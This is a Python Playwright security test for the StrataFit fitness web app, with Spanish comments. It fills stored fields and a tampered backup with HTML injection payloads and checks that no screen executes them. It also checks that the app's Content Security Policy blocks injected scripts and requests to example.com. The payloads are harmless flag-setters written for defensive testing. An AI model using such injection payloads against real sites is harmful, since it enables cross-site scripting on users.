"""Prueba de inyección de HTML: rellena nombres, notas, campos numéricos y la foto de perfil con código HTML malicioso y
recorre las 47 pantallas de tests/shots.py. Falla si alguna pantalla llega a ejecutar ese código (un dato mal escapado).
Ese recorrido va sin la CSP (bypass_csp), para probar el escapado por sí solo; luego se prueba la CSP, la segunda barrera:
con ella, ni un atributo on…= ni un <script> añadido se ejecutan, y no salen imágenes ni conexiones a otros sitios.
Además comprueba que una copia de seguridad o unos datos guardados con una foto de perfil manipulada no la cargan, y
que una copia de seguridad manipulada entera (código HTML en cada texto, en lugar de cada número y en claves nuevas) se
restaura sin que ninguna pantalla ni ningún aviso lo ejecuten y sin que la app se rompa: lo que no vale se descarta al
arrancar (core/repair).

  python3 tests/security.py dist/stratafit.html
"""
import os, sys, datetime
from playwright.sync_api import sync_playwright

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from shots import SCR  # noqa: E402
from browser import launch, app_url, context_opts  # noqa: E402


def rd(n):
    t = open(os.path.join(HERE, n), encoding='utf-8').read()
    return chr(10).join(l for l in t.split(chr(10)) if not l.startswith('//'))


PAY = '"\'><img src=x onerror="window.__x=(window.__x||[]).concat(window.__scr)"><b>'
# foto de perfil que intenta salirse del atributo src (auditoría S1)
IMG = 'x" onerror="window.__x=(window.__x||[]).concat(\'foto \'+window.__scr)'
MUT = """(P=>{const deep=o=>{if(o&&typeof o=='object')for(const k in o){const v=o[k];if(typeof v=='string'&&['n','nt','x','name','nm'].includes(k))o[k]=v+P;else deep(v)}};
 deep(S.customExercises);deep(S.routines);deep(S.ownPrograms);deep(S.logs);deep(S.plan);
 Object.keys(S.exerciseNotes||{}).forEach(k=>{S.exerciseNotes[k]+=P});
 S.profile=S.profile||{};S.profile.name='Yo'+P;S.profile.email=P;S.profile.tel=P;S.profile.img=%s;
 S.biometrics=Object.assign(S.biometrics||{},{age:P,h:P,w:P});S.nutritionGoals=Object.assign(S.nutritionGoals||{},{k:P});
 const d=Object.keys(S.meals||{})[0];if(d)Object.values(S.meals[d]).forEach(l=>(l||[]).forEach(it=>{it.g=P}));
 S.wodConfig=Object.assign(S.wodConfig||{},{md:'amrap',min:P});
 S.myFoods=(S.myFoods||[]).concat([{n:'Galleta'+P,b:[400,60,6,15,2,.5]}]);
 saveState()})(%s)""" % (repr(IMG), repr(PAY))


# lo que haría un dato que llegara sin escapar: un atributo on…=, un <script> nuevo, una imagen y una conexión a otro sitio
ATTACK = """document.body.insertAdjacentHTML('beforeend','<img src="data:," onerror="window.__y=1"><img src="https://example.com/p.png?d=1">');
 const s=document.createElement('script');s.textContent='window.__y=2';document.body.appendChild(s);
 fetch('https://example.com/?d=1').catch(()=>{})"""


def csp_check(b, path):
    """Con la CSP puesta (sin bypass): [(comprobación, correcta, detalle)]."""
    c = b.new_context(viewport={'width': 390, 'height': 844}, **context_opts(path))
    c.add_init_script(rd('init.js'))
    pg = c.new_page()
    pg.goto(app_url(path))
    pg.wait_for_timeout(800)
    ev = pg.evaluate
    pol = ev("(document.querySelector('meta[http-equiv=Content-Security-Policy]')||{}).content||''")
    clean = ev('window.__csp||[]')
    ev(ATTACK)
    pg.wait_for_timeout(700)
    v = ev('window.__csp||[]')
    out = [('la CSP está puesta y la app arranca con ella sin bloqueos', bool(pol) and ev('!!window.__ffok') and not clean, [pol[:80], clean]),
           ('con la CSP no se ejecuta código inyectado (on…= ni <script>)', ev('window.__y') is None and len([x for x in v if x.startswith('script-src')]) >= 2, v),
           ('con la CSP no salen imágenes ni conexiones a otros sitios', any(x.startswith('img-src') for x in v) and any(x.startswith('connect-src') for x in v), v)]
    c.close()
    return out


# datos de todos los tipos que guarda la app, con los campos que no siempre están (tempo, unidad, rango, bloque, técnica…)
RICH = """(()=>{const e=S.plan[0].ex;Object.assign(e[0],{t:'3/0/1/0',r:120,rg:[6,10],b:'b1',o:'Press banca',ou:{rg:[8,12]},tk:'DS'});e[1].b='b1';
 e.push({n:'Plancha',s:2,u:'s',rg:[40,40]},{n:'Farmers carry 200 m',s:2,u:'m',rg:[200,200]});
 S.lastWeights={'Press banca':80};S.routines[0].img='pecho';S.routines[0].bl[0].r=90;S.stagnationDismissed={'Press banca':Date.now()};S.deloadWeeks={3:1};
 S.barcodeCache={'8410000000000':{n:'Galletas',b:[450,60,6,20,2,.5],t:Date.now(),ns:'c'}};S.weighReminder={n:2,u:'w',t:Date.now(),sh:'2026-10-20',sn:'2026-10-22'};
 S.cloudBackup={at:Date.now(),lg:3,md:2};S.wodConfig={m:'tabata',a:12,en:10,ei:60,tw:20,tr:10,tn:8,ct:0,pre:10};S.biometrics={sex:'M',age:30,h:180,w:80,act:2,goal:1};
 S.reports=[{id:'prueba-1793782800000',k:'f',a:'Algo se ve mal',t:'La gráfica de peso no se ve bien',ca:1793782800000,s:1,st:'v',rp:'Arreglado',ra:1793782900000}];
 S.exerciseHistory['Press banca'][0].s.push([12,60,9,1,'DS']);S.exerciseHistory['Press banca'][0].t=1793782800000;S.logs[S.logs.length-1].t=1793782800000;
 S.accent=-1;S.accentColor='#ff2d55';S.units='lb';saveState()})()"""
# una copia de seguridad manipulada: a cada texto se le añade el código; con `numbers`, además, cada número pasa a ser ese
# código (un texto donde la app espera un número) y cada objeto gana una clave con él. El plan conserva sus series, porque
# sin ellas la copia entera se rechaza por dañada, que es otra prueba
TAMPER = """([P,numbers])=>{const seen=new Set();
 const deep=o=>{if(!o||typeof o!='object'||seen.has(o))return;seen.add(o);
  for(const k of Object.keys(o)){const v=o[k];if(typeof v=='string')o[k]=v+P;else if(typeof v=='number'&&numbers)o[k]=P;else deep(v)}
  if(numbers&&!Array.isArray(o)){const f=Object.values(o)[0];o['k'+P]=Array.isArray(f)?[]:f&&typeof f=='object'?{}:P}};
 const s=stateToStored(S);delete s.pf;deep(s);
 (s.plan||[]).forEach(d=>(d.ex||[]).forEach(e=>{e.s=3}));(s.cp||[]).forEach(p=>(p.plan||[]).forEach(d=>(d.ex||[]).forEach(e=>{e.s=3})));
 return JSON.stringify(Object.assign({_sf:{app:'StrataFit',fmt:2,ver:'1.0.3'+P,at:'2026-10-29T12:00:00Z'+P,sum:['x'+P]}},s))}"""
# además de las 47 pantallas, los avisos y las hojas que enseñan datos guardados
MORE = {
    'borrar registro': "A.openLogs();A.logDeleteAsk(0)", 'borrar el último registro': "A.openLogs();A.logDeleteAsk(S.logs.length-1)",
    'borrar workout': "A.routineEditorBack();A.routineListDeleteAsk(0)", 'editar workout': "A.routineEditorBack();A.routineEdit(0)",
    'borrar medición': "A.openMeasures();A.measureDeleteAsk(0)", 'historial en el entreno': "A.startWorkout();A.exerciseHistory(0)", 'swap': "A.startWorkout();A.openSwap(0)",
    'guardar entreno': "A.startWorkout();W.sets.forEach(a=>a.forEach(s=>{s.ok=1}));A.finishSave()", 'resumen': "showSummary()",
    'ficha de ejercicio propio': "A.openLibrary();A.exerciseDetail(exAll().length-1)", 'renombrar ejercicio': "A.openLibrary();A.customRenamePage(exAll().length-1)",
    'eliminar ejercicio': "A.openLibrary();A.customDeleteAsk(exAll().length-1)", 'grupo de la librería': "A.openLibrary();A.libraryGroup(0,{dataset:{v:'Pecho'}})",
    'añadir ejercicio': "A.openPicker()", 'historial de peso': "S.tab=2;R();A.openWeight();document.querySelectorAll('details').forEach(d=>d.open=true)",
    'borrar pesaje': "S.tab=2;R();A.openWeight();(b=>b&&b.click())(document.querySelector('[data-a=weightDeleteAsk]'))", 'estancamiento': "S.tab=2;R();A.stagnationInfo(0)",
    'restaurar copia': "A.openBackup();pendingRestore=parseBackup(buildBackup());confirmDialog('¿Restaurar esta copia?','x','doNothing','Restaurar')",
}


def tampered(b, path, numbers):
    """Restaura una copia manipulada y recorre la app: (¿arranca?, pantallas que ejecutan el código, pantallas que fallan)."""
    c = b.new_context(viewport={'width': 390, 'height': 844}, bypass_csp=True, **context_opts(path))
    c.add_init_script(rd('init.js'))
    pg = c.new_page()
    broken = []
    pg.on('pageerror', lambda e: broken.append('error de página: ' + str(e)[:120]))
    pg.clock.install(time=datetime.datetime(2026, 10, 29, 12, 0, 0))
    pg.goto(app_url(path))
    pg.clock.run_for(800)
    pg.evaluate(rd('seed.js'))
    pg.evaluate(rd('extra.js'))
    pg.evaluate(RICH)
    pg.clock.run_for(400)
    text = pg.evaluate(TAMPER, [PAY, numbers])
    # como al restaurarla: se lee (parseBackup), sustituye a todo lo guardado y la app arranca con ella
    # (sin dejar correr el reloj entre medias: lo manipulado solo llega a la app al arrancar, ya revisado, como al restaurar)
    pg.evaluate("t=>{const r=parseBackup(t);Object.keys(S).forEach(k=>delete S[k]);Object.assign(S,stateFromStored(r.s));saveState();window.__scr='arranque'}", text)
    pg.reload()
    pg.wait_for_load_state('load')
    pg.clock.run_for(900)
    alive = pg.evaluate('!!window.__ffok')
    for k, js in list(SCR.items()) + list(MORE.items()):
        try:
            pg.evaluate("window.__scr=%r;document.querySelector('#dg').innerHTML='';sheet();if(W){W=null};S.planBackup=null" % k)
            pg.evaluate(js)
            pg.clock.run_for(300)
            pg.wait_for_timeout(60)
        except Exception as e:
            broken.append(k + ': ' + str(e).split(chr(10))[0][:120])
    hit = sorted(set(str(x) for x in pg.evaluate('window.__x||[]')))
    c.close()
    return alive, hit, broken


def main(path):
    path = os.path.abspath(path)
    with sync_playwright() as p:
        b = launch(p)
        c = b.new_context(viewport={'width': 390, 'height': 844}, bypass_csp=True, **context_opts(path))
        c.add_init_script(rd('init.js'))
        pg = c.new_page()
        pg.on('dialog', lambda d: d.accept())
        pg.clock.install(time=datetime.datetime(2026, 10, 29, 12, 0, 0))
        pg.goto(app_url(path))
        pg.clock.run_for(800)
        pg.evaluate(rd('seed.js'))
        pg.evaluate(rd('extra.js'))
        pg.evaluate(MUT)
        pg.reload()
        pg.wait_for_load_state('load')
        pg.clock.run_for(800)
        bad = []
        # unos datos guardados con la foto manipulada: al arrancar se descarta
        stored = pg.evaluate("S.profile.img===undefined")
        for k, js in SCR.items():
            try:
                pg.evaluate("window.__scr=%r;sheet();if(W){W=null}" % k)
                pg.evaluate(js)
                pg.clock.run_for(300)
                pg.wait_for_timeout(100)
            except Exception as e:
                bad.append(k + ': ' + str(e)[:80])
        # y aunque llegara a la memoria, Perfil no la inserta: solo admite imágenes de verdad
        pg.evaluate("window.__scr='perfil con foto manipulada';sheet();W=null;S.profile.img=%s;S.tab=3;R()" % repr(IMG))
        pg.clock.run_for(300)
        pg.wait_for_timeout(100)
        # una copia de seguridad con la foto manipulada se lee sin ella (y la cuenta como arreglada)
        restored = pg.evaluate("(img=>{const r=parseBackup(JSON.stringify(Object.assign({},stateToStored(S),{pf:{name:'Ana',img}})));return [r.s.pf.img===undefined,r.s.pf.name,r.fix]})(%s)" % repr(IMG))
        good = pg.evaluate("(()=>{const ok='data:image/jpeg;base64,/9j/4AAQSkZJRg==';return parseBackup(JSON.stringify(Object.assign({},stateToStored(S),{pf:{img:ok}}))).s.pf.img===ok})()")
        hit = sorted(set(str(x) for x in pg.evaluate('window.__x||[]')))
        # control: en este recorrido (sin CSP) un HTML inyectado de verdad sí se ejecuta, así que la prueba lo vería
        pg.evaluate("document.body.insertAdjacentHTML('beforeend','<img src=\"data:,\" onerror=\"window.__z=1\">')")
        pg.clock.run_for(200)
        pg.wait_for_timeout(300)
        control = pg.evaluate('window.__z') == 1
        c.close()
        csp = csp_check(b, path)
        fake = [('con código HTML en cada texto', tampered(b, path, False)), ('con código HTML también en lugar de cada número y en claves nuevas', tampered(b, path, True))]
        b.close()
    print('  pantallas recorridas:', len(SCR))
    print('  ' + ('ok    ' if not hit else 'FALLA ') + 'ninguna ejecuta HTML inyectado', hit or '')
    print('  ' + ('ok    ' if control else 'FALLA ') + 'control: sin la CSP, un HTML inyectado sí se ejecutaría (la prueba lo detecta)')
    print('  ' + ('ok    ' if stored else 'FALLA ') + 'al arrancar se descarta una foto de perfil que no es una imagen')
    print('  ' + ('ok    ' if restored[0] and restored[1] is None and restored[2] >= 1 else 'FALLA ') + 'una copia con la foto manipulada se restaura sin ella (y sin datos personales)', '' if restored[0] else restored)
    print('  ' + ('ok    ' if good else 'FALLA ') + 'una foto de perfil de verdad sí se conserva')
    for name, cond, info in csp:
        print('  ' + ('ok    ' if cond else 'FALLA ') + name, '' if cond else info)
    for name, (alive, hits, broken) in fake:
        fine = alive and not hits and not broken
        print('  ' + ('ok    ' if fine else 'FALLA ') + 'una copia manipulada, %s: la app arranca y ni sus %d pantallas y avisos lo ejecutan ni fallan' % (name, len(SCR) + len(MORE)),
              '' if fine else 'arranca: %s · lo ejecutan: %s · fallan: %s' % (alive, hits, broken[:5]))
    if bad:
        print('  FALLA errores al abrir pantallas:', bad[:5])
    ok = not hit and not bad and stored and restored[0] and restored[1] is None and restored[2] >= 1 and good and control and all(x[1] for x in csp) and all(a and not h and not e for _, (a, h, e) in fake)
    print('\n' + ('TODO CORRECTO' if ok else 'FALLAN'))
    sys.exit(0 if ok else 1)


main(sys.argv[1] if len(sys.argv) > 1 else 'dist/stratafit.html')
